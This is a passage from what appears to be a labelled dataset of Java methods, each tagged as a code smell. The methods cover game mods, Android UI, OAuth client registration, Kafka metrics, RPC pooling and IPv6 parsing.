  this.tasks.compute(expectedTask.param,state);
  return state.finish();
}",1,Code Smell
"private void checkForMatch(ItemStack item_stack){
  int savedCollected=getCollectedItemCount(item_stack);
  int maxCollected=getMaxCollectedItemCount(item_stack);
  int nowCollected=savedCollected + item_stack.getCount();
  System.out.print(""RewardForPossessingItemImplementation - "" + this.getAgentName() + "": "");
  System.out.println(nowCollected);
  if (item_stack != null) {
    for (    ItemMatcher matcher : this.matchers) {
      if (matcher.matches(item_stack)) {
        if (params.isSparse()) {
          if (maxCollected >= matcher.matchSpec.getAmount())           break;
 else           if (nowCollected >= matcher.matchSpec.getAmount()) {
            int dimension=params.getDimension();
            float adjusted_reward=this.adjustAndDistributeReward(((BlockOrItemSpecWithReward)matcher.matchSpec).getReward().floatValue(),params.getDimension(),((BlockOrItemSpecWithReward)matcher.matchSpec).getDistribution());
            addCachedReward(dimension,adjusted_reward);
          }
        }
 else {
          int number_threshold_crossings=0;
          if (params.isExcludeLoops()) {
            number_threshold_crossings=(int)Math.floor(nowCollected / matcher.matchSpec.getAmount()) - (int)Math.floor(maxCollected / matcher.matchSpec.getAmount());
          }
 else {
            number_threshold_crossings=(int)Math.floor(item_stack.getCount() / matcher.matchSpec.getAmount());
          }
          if (number_threshold_crossings > 0) {
            int dimension=params.getDimension();
            float adjusted_reward=this.adjustAndDistributeReward(((BlockOrItemSpecWithReward)matcher.matchSpec).getReward().floatValue() * number_threshold_crossings,params.getDimension(),((BlockOrItemSpecWithReward)matcher.matchSpec).getDistribution());
            addCachedReward(dimension,adjusted_reward);
          }
        }
      }
    }
    addCollectedItemCount(item_stack);
  }
}",1,Code Smell
"@EventHandler private void onRender2D(Render2DEvent event){
  TextRenderer text=TextRenderer.get();
  Vector3d center=new Vector3d(mc.getWindow().getFramebufferWidth() / 2.0,mc.getWindow().getFramebufferHeight() / 2.0,0);
  int textRenderDist=textRenderDistance.get();
  for (  Waypoint waypoint : Waypoints.get()) {
    if (!waypoint.visible.get() || !Waypoints.checkDimension(waypoint))     continue;
    BlockPos blockPos=waypoint.getPos();
    Vector3d pos=new Vector3d(blockPos.getX() + 0.5,blockPos.getY(),blockPos.getZ() + 0.5);
    double dist=PlayerUtils.distanceToCamera(pos.x,pos.y,pos.z);
    if (dist > waypoint.maxVisible.get())     continue;
    if (!NametagUtils.to2D(pos,1))     continue;
    double distToCenter=pos.distance(center);
    double a=1;
    if (dist < 20) {
      a=(dist - 10) / 10;
      if (a < 0.01)       continue;
    }
    NametagUtils.scale=waypoint.scale.get() - 0.2;
    NametagUtils.begin(pos);
    waypoint.renderIcon(-16,-16,a,32);
    if (distToCenter <= textRenderDist) {
      int preTextA=TEXT.a;
      TEXT.a*=a;
      text.begin();
      text.render(waypoint.name.get(),-text.getWidth(waypoint.name.get()) / 2,-16 - text.getHeight(),TEXT,true);
      String distText=String.format(""%d blocks"",(int)Math.round(dist));
      text.render(distText,-text.getWidth(distText) / 2,16,TEXT,true);
      text.end();
      TEXT.a=preTextA;
    }
    NametagUtils.end();
  }
}",1,Code Smell
"@Override public PageResult<? extends StreamSource> listByCondition(SourcePageRequest request){
  PageHelper.startPage(request.getPageNum(),request.getPageSize());
  OrderFieldEnum.checkOrderField(request);
  OrderTypeEnum.checkOrderType(request);
  Page<StreamSourceEntity> entityPage=(Page<StreamSourceEntity>)sourceMapper.selectByCondition(request);
  Map<String,Page<StreamSourceEntity>> sourceMap=Maps.newHashMap();
  for (  StreamSourceEntity entity : entityPage) {
    sourceMap.computeIfAbsent(entity.getSourceType(),k -> new Page<>()).add(entity);
  }
  List<StreamSource> responseList=Lists.newArrayList();
  for (  Map.Entry<String,Page<StreamSourceEntity>> entry : sourceMap.entrySet()) {
    StreamSourceOperator sourceOperator=operatorFactory.getInstance(entry.getKey());
    PageResult<? extends StreamSource> pageInfo=sourceOperator.getPageInfo(entry.getValue());
    if (null != pageInfo && CollectionUtils.isNotEmpty(pageInfo.getList())) {
      responseList.addAll(pageInfo.getList());
    }
  }
  PageResult<? extends StreamSource> pageResult=new PageResult<>(responseList,entityPage.getTotal(),entityPage.getPageNum(),entityPage.getPageSize());
  LOGGER.debug(""success to list source page, result size {}"",pageResult.getList().size());
  return pageResult;
}
@Override public PageResult<? extends StreamSource> listByCondition(SourcePageRequest request,UserInfo opInfo){
  PageHelper.startPage(request.getPageNum(),request.getPageSize());
  OrderFieldEnum.checkOrderField(request);
  OrderTypeEnum.checkOrderType(request);
  List<StreamSourceEntity> entityList=sourceMapper.selectByCondition(request);
  List<StreamSourceEntity> filteredEntitys=Lists.newArrayList();
  if (opInfo.getAccountType().equals(TenantUserTypeEnum.TENANT_ADMIN.getCode())) {
    filteredEntitys.addAll(entityList);
  }
 else {
    Set<String> totalGroupIds=new HashSet<>();
    Set<String> allowedGroupIds=new HashSet<>();
    for (    StreamSourceEntity sourceEntity : entityList) {
      totalGroupIds.add(sourceEntity.getInlongGroupId());
    }
    for (    String groupId : totalGroupIds) {
      InlongGroupEntity entity=groupMapper.selectByGroupId(groupId);
      if (entity == null) {
        continue;
      }
      List<String> inCharges=Arrays.asList(entity.getInCharges().split(InlongConstants.COMMA));
      if (!inCharges.contains(opInfo.getName())) {
        continue;
      }
      allowedGroupIds.add(groupId);
    }
    for (    StreamSourceEntity sourceEntity : entityList) {
      if (allowedGroupIds.contains(sourceEntity.getInlongGroupId())) {
        filteredEntitys.add(sourceEntity);
      }
    }
  }
  Map<String,Page<StreamSourceEntity>> sourceMap=Maps.newHashMap();
  for (  StreamSourceEntity entity : filteredEntitys) {
    sourceMap.computeIfAbsent(entity.getSourceType(),k -> new Page<>()).add(entity);
  }
  List<StreamSource> responseList=Lists.newArrayList();
  for (  Map.Entry<String,Page<StreamSourceEntity>> entry : sourceMap.entrySet()) {
    StreamSourceOperator sourceOperator=operatorFactory.getInstance(entry.getKey());
    PageResult<? extends StreamSource> pageInfo=sourceOperator.getPageInfo(entry.getValue());
    if (null != pageInfo && CollectionUtils.isNotEmpty(pageInfo.getList())) {
      responseList.addAll(pageInfo.getList());
    }
  }
  return new PageResult<>(responseList);
}
",1,Code Smell
"public void updateSelectedMediaTabText(){
  if (sharedMediaLayout == null || mediaCounterTextView == null) {
    return;
  }
  int id=sharedMediaLayout.getClosestTab();
  int[] mediaCount=sharedMediaPreloader.getLastMediaCount();
  if (id == 0) {
    if (mediaCount[MediaDataController.MEDIA_VIDEOS_ONLY] == 0 && mediaCount[MediaDataController.MEDIA_PHOTOS_ONLY] == 0) {
      mediaCounterTextView.setText(LocaleController.formatPluralString(""Media"",mediaCount[MediaDataController.MEDIA_PHOTOVIDEO]));
    }
 else     if (sharedMediaLayout.getPhotosVideosTypeFilter() == SharedMediaLayout.FILTER_PHOTOS_ONLY || mediaCount[MediaDataController.MEDIA_VIDEOS_ONLY] == 0) {
      mediaCounterTextView.setText(LocaleController.formatPluralString(""Photos"",mediaCount[MediaDataController.MEDIA_PHOTOS_ONLY]));
    }
 else     if (sharedMediaLayout.getPhotosVideosTypeFilter() == SharedMediaLayout.FILTER_VIDEOS_ONLY || mediaCount[MediaDataController.MEDIA_PHOTOS_ONLY] == 0) {
      mediaCounterTextView.setText(LocaleController.formatPluralString(""Videos"",mediaCount[MediaDataController.MEDIA_VIDEOS_ONLY]));
    }
 else {
      String str=String.format(""%s, %s"",LocaleController.formatPluralString(""Photos"",mediaCount[MediaDataController.MEDIA_PHOTOS_ONLY]),LocaleController.formatPluralString(""Videos"",mediaCount[MediaDataController.MEDIA_VIDEOS_ONLY]));
      mediaCounterTextView.setText(str);
    }
  }
 else   if (id == 1) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""Files"",mediaCount[MediaDataController.MEDIA_FILE]));
  }
 else   if (id == 2) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""Voice"",mediaCount[MediaDataController.MEDIA_AUDIO]));
  }
 else   if (id == 3) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""Links"",mediaCount[MediaDataController.MEDIA_URL]));
  }
 else   if (id == 4) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""MusicFiles"",mediaCount[MediaDataController.MEDIA_MUSIC]));
  }
 else   if (id == 5) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""GIFs"",mediaCount[MediaDataController.MEDIA_GIF]));
  }
 else   if (id == 6) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""CommonGroups"",userInfo.common_chats_count));
  }
 else   if (id == 7) {
    mediaCounterTextView.setText(onlineTextView[1].getText());
  }
}",1,Code Smell
"@Override protected boolean onExecute(String verb,String parameter,MissionInit missionInit){
  if (verb.equalsIgnoreCase(HumanLevelCommand.MOVE_MOUSE.value())) {
    if (parameter != null && parameter.length() != 0) {
      String[] params=parameter.split("" "");
      if (params.length != 2 && params.length != 3) {
        System.out.println(""Malformed parameter string ("" + parameter + "") - expected <x> <y>, or <x> <y> <z>"");
        return false;
      }
      Integer x, y, z;
      try {
        x=Integer.valueOf(params[0]);
        y=Integer.valueOf(params[1]);
        z=params.length == 3 ? Integer.valueOf(params[2]) : 0;
      }
 catch (      NumberFormatException e) {
        System.out.println(""Malformed parameter string ("" + parameter + "") - ""+ e.getMessage());
        return false;
      }
      if (x == null || y == null) {
        System.out.println(""Malformed parameter string ("" + parameter + "")"");
        return false;
      }
      if (x != 0 || y != 0) {
        Minecraft mc=Minecraft.getMinecraft();
        float f=mc.gameSettings.mouseSensitivity * 0.6F + 0.2F;
        float f1=f * f * f* 8.0F;
        float f2=(float)x * f1;
        float f3=(float)y * f1;
        if (mc.gameSettings.invertMouse)         f3=-f3;
        if (this.isOverriding())         mc.player.turn(this.targetYawDelta,this.targetPitchDelta);
        int renderTicksPerClientTick=this.clientTickMonitor.getEventsPerSecond() >= 1 ? (int)Math.ceil(this.renderTickMonitor.getEventsPerSecond() / this.clientTickMonitor.getEventsPerSecond()) : 0;
        renderTicksPerClientTick=Math.max(1,renderTicksPerClientTick);
        this.targetYawDelta=f2;
        this.targetPitchDelta=f3;
        this.targetYawDeltaDelta=f2 / (float)renderTicksPerClientTick;
        this.targetPitchDeltaDelta=f3 / (float)renderTicksPerClientTick;
      }
      if (z != 0) {
        if (!Minecraft.getMinecraft().player.isSpectator() && this.isOverriding()) {
          Minecraft.getMinecraft().player.inventory.changeCurrentItem(z);
        }
      }
      return true;
    }
  }
  return super.onExecute(verb,parameter,missionInit);
}",1,Code Smell
"@Override public RegisteredClient convert(OidcClientRegistration clientRegistration){
  RegisteredClient.Builder builder=RegisteredClient.withId(UUID.randomUUID().toString()).clientId(CLIENT_ID_GENERATOR.generateKey()).clientIdIssuedAt(Instant.now()).clientName(clientRegistration.getClientName());
  if (ClientAuthenticationMethod.CLIENT_SECRET_POST.getValue().equals(clientRegistration.getTokenEndpointAuthenticationMethod())) {
    builder.clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_POST).clientSecret(CLIENT_SECRET_GENERATOR.generateKey());
  }
 else   if (ClientAuthenticationMethod.CLIENT_SECRET_JWT.getValue().equals(clientRegistration.getTokenEndpointAuthenticationMethod())) {
    builder.clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_JWT).clientSecret(CLIENT_SECRET_GENERATOR.generateKey());
  }
 else   if (ClientAuthenticationMethod.PRIVATE_KEY_JWT.getValue().equals(clientRegistration.getTokenEndpointAuthenticationMethod())) {
    builder.clientAuthenticationMethod(ClientAuthenticationMethod.PRIVATE_KEY_JWT);
  }
 else {
    builder.clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_BASIC).clientSecret(CLIENT_SECRET_GENERATOR.generateKey());
  }
  builder.redirectUris((redirectUris) -> redirectUris.addAll(clientRegistration.getRedirectUris()));
  if (!CollectionUtils.isEmpty(clientRegistration.getPostLogoutRedirectUris())) {
    builder.postLogoutRedirectUris((postLogoutRedirectUris) -> postLogoutRedirectUris.addAll(clientRegistration.getPostLogoutRedirectUris()));
  }
  if (!CollectionUtils.isEmpty(clientRegistration.getGrantTypes())) {
    builder.authorizationGrantTypes((authorizationGrantTypes) -> clientRegistration.getGrantTypes().forEach((grantType) -> authorizationGrantTypes.add(new AuthorizationGrantType(grantType))));
  }
 else {
    builder.authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE);
  }
  if (CollectionUtils.isEmpty(clientRegistration.getResponseTypes()) || clientRegistration.getResponseTypes().contains(OAuth2AuthorizationResponseType.CODE.getValue())) {
    builder.authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE);
  }
  if (!CollectionUtils.isEmpty(clientRegistration.getScopes())) {
    builder.scopes((scopes) -> scopes.addAll(clientRegistration.getScopes()));
  }
  ClientSettings.Builder clientSettingsBuilder=ClientSettings.builder().requireProofKey(true).requireAuthorizationConsent(true);
  if (ClientAuthenticationMethod.CLIENT_SECRET_JWT.getValue().equals(clientRegistration.getTokenEndpointAuthenticationMethod())) {
    MacAlgorithm macAlgorithm=MacAlgorithm.from(clientRegistration.getTokenEndpointAuthenticationSigningAlgorithm());
    if (macAlgorithm == null) {
      macAlgorithm=MacAlgorithm.HS256;
    }
    clientSettingsBuilder.tokenEndpointAuthenticationSigningAlgorithm(macAlgorithm);
  }
 else   if (ClientAuthenticationMethod.PRIVATE_KEY_JWT.getValue().equals(clientRegistration.getTokenEndpointAuthenticationMethod())) {
    SignatureAlgorithm signatureAlgorithm=SignatureAlgorithm.from(clientRegistration.getTokenEndpointAuthenticationSigningAlgorithm());
    if (signatureAlgorithm == null) {
      signatureAlgorithm=SignatureAlgorithm.RS256;
    }
    clientSettingsBuilder.tokenEndpointAuthenticationSigningAlgorithm(signatureAlgorithm);
    clientSettingsBuilder.jwkSetUrl(clientRegistration.getJwkSetUrl().toString());
  }
  builder.clientSettings(clientSettingsBuilder.build()).tokenSettings(TokenSettings.builder().idTokenSignatureAlgorithm(SignatureAlgorithm.RS256).build());
  return builder.build();
}",1,Code Smell
"private void updateClipView(boolean fromLayout){
  int height=0;
  int top;
  RecyclerView.ViewHolder holder=listView.findViewHolderForAdapterPosition(0);
  if (holder != null) {
    top=(int)holder.itemView.getY();
    height=overScrollHeight + (Math.min(top,0));
  }
 else {
    top=-mapViewClip.getMeasuredHeight();
  }
  FrameLayout.LayoutParams layoutParams=(FrameLayout.LayoutParams)mapViewClip.getLayoutParams();
  if (layoutParams != null) {
    if (height <= 0) {
      if (mapView.getView().getVisibility() == View.VISIBLE) {
        mapView.getView().setVisibility(View.INVISIBLE);
        mapViewClip.setVisibility(View.INVISIBLE);
        if (overlayView != null) {
          overlayView.setVisibility(View.INVISIBLE);
        }
      }
    }
 else {
      if (mapView.getView().getVisibility() == View.INVISIBLE) {
        mapView.getView().setVisibility(View.VISIBLE);
        mapViewClip.setVisibility(View.VISIBLE);
        if (overlayView != null) {
          overlayView.setVisibility(View.VISIBLE);
        }
      }
    }
    mapViewClip.setTranslationY(Math.min(0,top));
    mapView.getView().setTranslationY(Math.max(0,-top / 2));
    if (overlayView != null) {
      overlayView.setTranslationY(Math.max(0,-top / 2));
    }
    float translationY=Math.min(overScrollHeight - mapTypeButton.getMeasuredHeight() - dp(64 + (locationType == LOCATION_TYPE_SEND || locationType == LOCATION_TYPE_SEND_WITH_LIVE ? 30 : 10)),-top);
    mapTypeButton.setTranslationY(translationY);
    proximityButton.setTranslationY(translationY);
    if (hintView != null) {
      hintView.setTranslationY(translationY);
    }
    if (searchAreaButton != null) {
      searchAreaButton.setTranslation(translationY);
    }
    if (markerImageView != null) {
      markerImageView.setTranslationY(markerTop=-top - dp(markerImageView.getTag() == null ? 48 : 69) + height / 2);
    }
    if (!fromLayout) {
      layoutParams=(FrameLayout.LayoutParams)mapView.getView().getLayoutParams();
      if (layoutParams != null && layoutParams.height != overScrollHeight + dp(10)) {
        layoutParams.height=overScrollHeight + dp(10);
        if (map != null) {
          map.setPadding(dp(70),0,dp(70),dp(10));
        }
        mapView.getView().setLayoutParams(layoutParams);
      }
      if (overlayView != null) {
        layoutParams=(FrameLayout.LayoutParams)overlayView.getLayoutParams();
        if (layoutParams != null && layoutParams.height != overScrollHeight + dp(10)) {
          layoutParams.height=overScrollHeight + dp(10);
          overlayView.setLayoutParams(layoutParams);
        }
      }
    }
  }
}",1,Code Smell
"private static ConnectClient getPool(String address,Class<? extends ConnectClient> connectClientImpl,final XxlRpcReferenceBean xxlRpcReferenceBean) throws Exception {
  if (connectClientMap == null) {
synchronized (ConnectClient.class) {
      if (connectClientMap == null) {
        connectClientMap=new ConcurrentHashMap<String,ConnectClient>();
        xxlRpcReferenceBean.getInvokerFactory().addStopCallBack(new BaseCallback(){
          @Override public void run() throws Exception {
            if (connectClientMap.size() > 0) {
              for (              String key : connectClientMap.keySet()) {
                ConnectClient clientPool=connectClientMap.get(key);
                clientPool.close();
              }
              connectClientMap.clear();
            }
          }
        }
);
      }
    }
  }
  ConnectClient connectClient=connectClientMap.get(address);
  if (connectClient != null && connectClient.isValidate()) {
    return connectClient;
  }
  Object clientLock=connectClientLockMap.get(address);
  if (clientLock == null) {
    connectClientLockMap.putIfAbsent(address,new Object());
    clientLock=connectClientLockMap.get(address);
  }
synchronized (clientLock) {
    connectClient=connectClientMap.get(address);
    if (connectClient != null && connectClient.isValidate()) {
      return connectClient;
    }
    if (connectClient != null) {
      connectClient.close();
      connectClientMap.remove(address);
    }
    ConnectClient connectClient_new=connectClientImpl.newInstance();
    try {
      connectClient_new.init(address,xxlRpcReferenceBean.getSerializerInstance(),xxlRpcReferenceBean.getInvokerFactory());
      connectClientMap.put(address,connectClient_new);
    }
 catch (    Exception e) {
      connectClient_new.close();
      throw e;
    }
    return connectClient_new;
  }
}",1,Code Smell
"/** 
 * 鍒嗙被銆�
 * @param chartPlugins
 * @return 鏈�鍚庝竴涓厓绱犲寘鍚墍鏈夋湭鍒嗙粍鐨剓@linkplain ChartPlugin}
 */
public List<Categorization> resolve(List<? extends ChartPlugin> chartPlugins){
  List<CategorizationInfo> categorizationInfos=new ArrayList<>();
  List<ChartPluginInfo> uncategorizeds=new ArrayList<>();
  for (  ChartPlugin chartPlugin : chartPlugins) {
    List<Category> categories=chartPlugin.getCategories();
    List<Integer> categoryOrders=chartPlugin.getCategoryOrders();
    if (categories == null || categories.isEmpty())     uncategorizeds.add(new ChartPluginInfo(chartPlugin,chartPlugin.getOrder()));
 else {
      for (int i=0; i < categories.size(); i++) {
        Category category=categories.get(i);
        Integer order=(categoryOrders == null || categoryOrders.size() < (i + 1) ? chartPlugin.getOrder() : categoryOrders.get(i));
        CategorizationInfo categorizationInfo=null;
        for (        CategorizationInfo myCategorizationInfo : categorizationInfos) {
          Category myCategory=myCategorizationInfo.getCategory();
          if (StringUtil.isEquals(category.getName(),myCategory.getName())) {
            categorizationInfo=myCategorizationInfo;
            if (category.hasNameLabel())             categorizationInfo.setCategory(category);
          }
        }
        if (categorizationInfo == null) {
          categorizationInfo=new CategorizationInfo(category);
          categorizationInfos.add(categorizationInfo);
        }
        categorizationInfo.addChartPluginInfo(new ChartPluginInfo(chartPlugin,(order == null ? chartPlugin.getOrder() : order.intValue())));
      }
    }
  }
  Collections.sort(categorizationInfos);
  if (!uncategorizeds.isEmpty()) {
    CategorizationInfo uncategorized=new CategorizationInfo(new Category(""""));
    uncategorized.setChartPluginInfos(uncategorizeds);
    categorizationInfos.add(uncategorized);
  }
  return toCategorizations(categorizationInfos);
}",1,Code Smell
"public static Map<String,Object> toMapWithKeyOfObjectProperty(Map<String,Object> dataMap,Class orClzz,XHelpful xHelpful,Dialect dialect){
  if (xHelpful == null && orClzz == null)   return dataMap;
  Map<String,Object> propertyMap=new HashMap<>();
  for (  Map.Entry<String,Object> entry : dataMap.entrySet()) {
    String mapper=entry.getKey();
    String property=null;
    BeanElement be=null;
    if (xHelpful == null) {
      Parsed parsed=Parser.get(orClzz);
      property=parsed.getPropertyByLower(mapper);
      be=parsed.getElement(property);
    }
 else {
      if (mapper.contains(SqlScript.DOLLOR)) {
        property=dialect.transformAlia(mapper,xHelpful.getAliaMap(),xHelpful.getResultKeyAliaMap());
      }
 else {
        mapper=dialect.transformAlia(mapper,xHelpful.getAliaMap(),xHelpful.getResultKeyAliaMap());
        property=xHelpful.getMapperPropertyMap().get(mapper);
        if (property == null) {
          property=mapper;
        }
 else         if (property.contains(""."")) {
          String[] arr=property.split(""\\."");
          String clzName=xHelpful.getAliaMap().get(arr[0]);
          Parsed parsed=Parser.get(clzName);
          if (parsed == null)           throw new ParsingException(""clzName: "" + clzName + "",alia: ""+ arr[0]+ "", property: ""+ arr[1]);
          be=parsed.getElement(arr[1]);
        }
 else {
          Parsed parsed=Parser.get(orClzz);
          be=parsed.getElement(property);
        }
      }
    }
    Object value=entry.getValue();
    value=filter(value);
    if (be != null) {
      value=dialect.mappingToObject(value,be);
    }
    propertyMap.put(property,value);
  }
  return propertyMap;
}",1,Code Smell
"@Unique private void queueTaskForSection(final int chunkX,final int chunkY,final int chunkZ,final Supplier<StarLightInterface.LightQueue.ChunkTasks> runnable){
  final ServerLevel world=(ServerLevel)this.getLightEngine().getWorld();
  final ChunkAccess center=this.getLightEngine().getAnyChunkNow(chunkX,chunkZ);
  if (center == null || !center.getStatus().isOrAfter(ChunkStatus.LIGHT)) {
    return;
  }
  if (center.getStatus() != ChunkStatus.FULL) {
    runnable.get();
    return;
  }
  if (!world.getChunkSource().chunkMap.mainThreadExecutor.isSameThread()) {
    world.getChunkSource().chunkMap.mainThreadExecutor.execute(() -> {
      this.queueTaskForSection(chunkX,chunkY,chunkZ,runnable);
    }
);
    return;
  }
  final long key=CoordinateUtils.getChunkKey(chunkX,chunkZ);
  final StarLightInterface.LightQueue.ChunkTasks updateFuture=runnable.get();
  if (updateFuture == null) {
    return;
  }
  if (updateFuture.isTicketAdded) {
    return;
  }
  updateFuture.isTicketAdded=true;
  final int references=this.chunksBeingWorkedOn.addTo(key,1);
  if (references == 0) {
    final ChunkPos pos=new ChunkPos(chunkX,chunkZ);
    world.getChunkSource().addRegionTicket(StarLightInterface.CHUNK_WORK_TICKET,pos,0,pos);
  }
  updateFuture.onComplete.thenAcceptAsync((  final Void ignore) -> {
    final int newReferences=this.chunksBeingWorkedOn.get(key);
    if (newReferences == 1) {
      this.chunksBeingWorkedOn.remove(key);
      final ChunkPos pos=new ChunkPos(chunkX,chunkZ);
      world.getChunkSource().removeRegionTicket(StarLightInterface.CHUNK_WORK_TICKET,pos,0,pos);
    }
 else {
      this.chunksBeingWorkedOn.put(key,newReferences - 1);
    }
  }
,world.getChunkSource().chunkMap.mainThreadExecutor).whenComplete((  final Void ignore,  final Throwable thr) -> {
    if (thr != null) {
      LOGGER.error(""Failed to remove ticket level for post chunk task "" + new ChunkPos(chunkX,chunkZ),thr);
    }
  }
);
}",1,Code Smell
"@Override public void handle(String target,HttpServletRequest request,HttpServletResponse response,boolean[] isHandled){
  if (target.indexOf('.') != -1) {
    return;
  }
  isHandled[0]=true;
  String[] urlPara={null};
  Action action=getAction(target,urlPara);
  if (action == null) {
    if (log.isWarnEnabled()) {
      String qs=request.getQueryString();
      log.warn(""404 Action Not Found: "" + (qs == null ? target : target + ""?"" + qs));
    }
    renderManager.getRenderFactory().getErrorRender(404).setContext(request,response).render();
    return;
  }
  Controller controller=null;
  try {
    controller=controllerFactory.getController(action.getControllerClass());
    CPI._init_(controller,action,request,response,urlPara[0]);
    SaControllerContext.hold(controller);
    if (devMode) {
      if (actionReporter.isReportAfterInvocation(request)) {
        new Invocation(action,controller).invoke();
        actionReporter.report(target,controller,action);
      }
 else {
        actionReporter.report(target,controller,action);
        new Invocation(action,controller).invoke();
      }
    }
 else {
      new Invocation(action,controller).invoke();
    }
    Render render=controller.getRender();
    if (render instanceof ForwardActionRender) {
      String actionUrl=((ForwardActionRender)render).getActionUrl();
      if (target.equals(actionUrl)) {
        throw new RuntimeException(""The forward action url is the same as before."");
      }
 else {
        handle(actionUrl,request,response,isHandled);
      }
      return;
    }
    if (render == null) {
      render=renderManager.getRenderFactory().getDefaultRender(action.getViewPath() + action.getMethodName());
    }
    render.setContext(request,response,action.getViewPath()).render();
  }
 catch (  RenderException e) {
    if (log.isErrorEnabled()) {
      String qs=request.getQueryString();
      log.error(qs == null ? target : target + ""?"" + qs,e);
    }
  }
catch (  ActionException e) {
    handleActionException(target,request,response,action,e);
  }
catch (  Exception e) {
    if (log.isErrorEnabled()) {
      String qs=request.getQueryString();
      String targetInfo=(qs == null ? target : target + ""?"" + qs);
      String sign=ReflectKit.getMethodSignature(action.getMethod());
      log.error(sign + "" : "" + targetInfo,e);
    }
    renderManager.getRenderFactory().getErrorRender(500).setContext(request,response,action.getViewPath()).render();
  }
 finally {
    SaControllerContext.release();
    controllerFactory.recycle(controller);
  }
}",1,Code Smell
"@Nullable private static byte[] parseV6(String s){
  int range=-1;
  byte[] data=new byte[16];
  String[] tokens=s.split("":"",-1);
  int first=0;
  int last=tokens.length - 1;
  if (tokens[0].length() == 0) {
    if (last - first > 0 && tokens[1].length() == 0)     first++;
 else     return null;
  }
  if (tokens[last].length() == 0) {
    if (last - first > 0 && tokens[last - 1].length() == 0)     last--;
 else     return null;
  }
  if (last - first + 1 > 8)   return null;
  int i, j;
  for (i=first, j=0; i <= last; i++) {
    if (tokens[i].length() == 0) {
      if (range >= 0)       return null;
      range=j;
      continue;
    }
    if (tokens[i].indexOf('.') >= 0) {
      if (i < last)       return null;
      if (i > 6)       return null;
      byte[] v4addr=parseV4(tokens[i]);
      if (v4addr == null)       return null;
      for (int k=0; k < 4; k++)       data[j++]=v4addr[k];
      break;
    }
    try {
      for (int k=0; k < tokens[i].length(); k++) {
        char c=tokens[i].charAt(k);
        if (Character.digit(c,16) < 0)         return null;
      }
      int x=Integer.parseInt(tokens[i],16);
      if (x > 0xFFFF || x < 0)       return null;
      data[j++]=(byte)(x >>> 8);
      data[j++]=(byte)(x & 0xFF);
    }
 catch (    NumberFormatException e) {
      return null;
    }
  }
  if (j < 16 && range < 0)   return null;
  if (range >= 0) {
    int empty=16 - j;
    System.arraycopy(data,range,data,range + empty,j - range);
    for (i=range; i < range + empty; i++)     data[i]=0;
  }
  return data;
}",1,Code Smell
"public RogueInfo toProto(){
  var schedule=GameDepot.getCurrentRogueSchedule();
  int seasonId=0;
  long beginTime=0;
  long endTime=1999999999;
  if (schedule != null) {
    seasonId=schedule.getRogueSeason();
  }
  var proto=RogueInfo.newInstance();
  var data=proto.getMutableRogueInfoData();
  var score=RogueScoreRewardInfo.newInstance().setPoolId(26).setPoolRefreshed(false).setHasTakenInitialScore(true).setScore(14000).setBeginTime(beginTime).setEndTime(endTime).addAllHasTakenReward(IntStream.rangeClosed(1,20).flatMap(i -> IntStream.generate(() -> i).limit(20)).toArray());
  var season=RogueSeasonInfo.newInstance().setBeginTime(beginTime).setSeasonId(seasonId).setEndTime(endTime);
  var aeonInfo=RogueAeonInfo.newInstance();
  aeonInfo.setIsUnlocked(false);
  if (true) {
    aeonInfo=RogueAeonInfo.newInstance().setUnlockAeonNum(GameData.getRogueAeonExcelMap().size());
    for (    var aeonExcel : GameData.getRogueAeonExcelMap().values()) {
      aeonInfo.addAeonIdList(aeonExcel.getAeonID());
    }
    aeonInfo.setIsUnlocked(true);
    aeonInfo.setUnlockAeonEnhanceNum(3);
  }
  data.setRogueScoreInfo(score).setRogueAeonInfo(aeonInfo).setRogueSeasonInfo(season).setRogueVirtualItemInfo(getPlayer().getCurRogueVirtualItem());
  RogueInstance instance=this.getPlayer().getRogueInstance();
  var areaInfo=RogueAreaInfo.newInstance();
  if (schedule != null) {
    for (int i=0; i < schedule.getRogueAreaIDList().length; i++) {
      var excel=GameData.getRogueAreaExcelMap().get(schedule.getRogueAreaIDList()[i]);
      if (excel == null)       continue;
      var area=RogueArea.newInstance().setAreaId(excel.getRogueAreaID()).setRogueStatus(4).setHasTakenRewards(true).setRogueAreaStatus(RogueAreaStatus.ROGUE_AREA_STATUS_FIRST_PASS.getNumber());
      if (instance != null && excel == instance.getExcel()) {
        area.setMapId(instance.getExcel().getMapId());
        area.setCurReachRoomNum(instance.getCurrentRoomProgress());
        area.setRogueStatus(4);
      }
      areaInfo.addRogueArea(area);
    }
  }
  data.setRogueAreaInfo(areaInfo);
  if (instance != null) {
    proto.setRogueCurrentInfo(instance.toProto());
  }
  return proto;
}",1,Code Smell
"@Override public PaginationResult<GroupTopicConsumedDetailVO> pagingGroupTopicConsumedMetrics(Long clusterPhyId,String topicName,String groupName,List<String> latestMetricNames,PaginationSortDTO dto) throws NotExistException, AdminOperateException {
  ClusterPhy clusterPhy=clusterPhyService.getClusterByCluster(clusterPhyId);
  if (clusterPhy == null) {
    return PaginationResult.buildFailure(MsgConstant.getClusterPhyNotExist(clusterPhyId),dto);
  }
  Map<TopicPartition,Long> consumedOffsetMap=groupService.getGroupOffsetFromKafka(clusterPhyId,groupName);
  List<Integer> partitionList=consumedOffsetMap.keySet().stream().filter(elem -> elem.topic().equals(topicName)).map(elem -> elem.partition()).collect(Collectors.toList());
  Collections.sort(partitionList);
  KSGroupDescription groupDescription=groupService.getGroupDescriptionFromKafka(clusterPhy,groupName);
  Map<TopicPartition,KSMemberDescription> tpMemberMap=new HashMap<>();
  if (!groupDescription.protocolType().equals(CONNECT_CLUSTER_PROTOCOL_TYPE)) {
    for (    KSMemberDescription description : groupDescription.members()) {
      KSMemberConsumerAssignment assignment=(KSMemberConsumerAssignment)description.assignment();
      for (      TopicPartition tp : assignment.topicPartitions()) {
        tpMemberMap.put(tp,description);
      }
    }
  }
  PaginationResult<GroupMetrics> metricsResult=this.pagingGroupTopicPartitionMetrics(clusterPhyId,groupName,topicName,partitionList,latestMetricNames,dto);
  if (metricsResult.failed()) {
    return PaginationResult.buildFailure(metricsResult,dto);
  }
